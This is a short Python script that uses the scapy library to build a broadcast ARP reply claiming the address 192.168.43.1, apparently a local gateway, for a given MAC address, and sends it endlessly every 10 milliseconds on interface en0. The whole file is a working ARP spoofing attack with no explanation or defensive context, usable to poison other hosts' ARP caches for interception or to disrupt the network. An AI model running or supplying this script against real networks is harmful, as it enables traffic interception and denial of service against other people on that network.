from scapy.all import *

eth = Ether()
arp = ARP(
    op='is-at',

    hwsrc='f8:4d:89:6a:0c:33',
    psrc='192.168.43.1',

    hwdst='ff:ff:ff:ff:ff:ff',
    pdst='192.168.43.255'
)

pkt = eth/arp

sendp(pkt, iface='en0', loop=1, inter=0.01)
